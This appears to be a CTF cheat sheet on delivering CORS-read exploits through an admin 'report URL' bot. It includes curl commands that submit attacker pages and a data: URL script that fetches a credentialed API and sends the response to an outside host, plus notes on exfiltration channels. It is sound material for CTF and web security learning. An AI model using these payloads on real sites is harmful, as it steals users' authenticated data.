# Bot delivery — the victim-viewer that carries the session

A CTF CORS read is against the bot's session — the admin/puppeteer
context whose fetch the exploit page makes. The delivery shapes.

---

## 1. The /report endpoint — the canonical hand-off

```bash
# the bot visits your page — your page's fetch rides the bot's session
curl -X POST "$BASE/report" -H 'Content-Type: application/json' \
  -d '{"url":"https://attacker/page"}'
# or a form field
curl -X POST "$BASE/visit" --data-urlencode 'url=https://attacker/page'
```

## 2. The airgapped bot — no external fetch

```text
the bot can't reach attacker.com — the exploit must live on the
target or be self-contained:
- a data: URL (the page IS the URL — the Origin is 'null')
- a stored-XSS page on the target (same-origin read — no CORS needed)
- a same-origin redirect chain
```

```bash
# the data: URL carries the whole exploit — the bot's fetch
# originates 'null' → needs a null-allowed CORS
curl -X POST "$BASE/report" --data-urlencode \
  'url=data:text/html,<script>fetch("http://127.0.0.1/api/x",{credentials:"include"}).then(r=>r.text()).then(d=>fetch("https://a/?d="+d))</script>'
```

## 3. The bot's session — whose credential rides

```text
the fetch reads under the BOT's session — the admin/flag-holder.
the exploit doesn't use YOUR cookie — it relies on the bot's
credentials:'include' carrying the bot's cookie. verify the bot has
the session — a flag cookie, a logged-in context.
```

## 4. The exfil reachability — can the bot reach your listener

```text
the read works but the exfil fetch('https://attacker/?d=...') fails
if the bot can't reach attacker.com. alternatives:
- a page-side readback — the bot screenshots the data into the DOM
- a POST to the target itself (a write that stores the flag for you)
- an in-band channel — a profile/comment the flag lands in
```

## 5. The headless-bot signals — puppeteer/playwright

```text
a bot that runs JS, holds a flag cookie, and visits a URL you give —
the standard CTF viewer. its Origin is its page's origin — your
attacker page's origin, or 'null' for a data: URL.
```

## 6. The `Origin: null` bot — a data: URL page

```text
a data: URL page's Origin is 'null' — it only passes a null-allowed
CORS. test: the bot's fetch hits the endpoint with Origin: null →
the response must ACAO:null+ACAC:true for the read to succeed.
```

## 7. The sandboxed-bot — a CSP/context constraint

```text
a bot that runs in a sandboxed or CSP'd context — the page's fetch
may be limited. a `sandbox="allow-scripts"` iframe's fetches still
work but the Origin is 'null'.
```

## 8. The bot's cookies — SameSite doesn't apply to its own fetch

```text
the bot's fetch('https://t/...', {credentials:'include'}) sends the
bot's cookie IF the cookie is SameSite=None — OR the fetch is
cross-site and the cookie is Lax → it doesn't attach. the SameSite
gate applies to the BOT'S cookie too.
```

## 9. The triage — what bot context does the challenge give

```bash
# the bot's config — the cookie, the URL field, the origin constraint
grep -rnoiE 'bot|admin|visit|report|puppeteer|playwright|chromium|flag.*cookie|cookie.*flag|setCookie|JSDOM|selenium' <src> | head -20
# the flag-cookie's SameSite — does it attach to the fetch?
grep -rnoiE 'cookie.*flag|flag.*cookie|sameSite|same_site' <src>
```

## 10. The readback-from-the-bot — how you see the exfil

```text
the bot's fetch sends the flag to your listener — the OOB hit is
the readback. OR the bot's page writes the flag to a public spot —
a comment, a profile — you then fetch same-origin. OR the bot's
screenshot captures the flag DOM.
```

## 11. The bot-delivery checklist

```text
1. find the bot endpoint — /report, /visit, an admin-trigger
2. confirm the bot's session — a flag cookie, a logged-in context
3. confirm the bot can fetch — external? airgapped? data:-only?
4. match the exploit's origin to the CORS allowlist
5. match the exfil to the bot's reachability
```
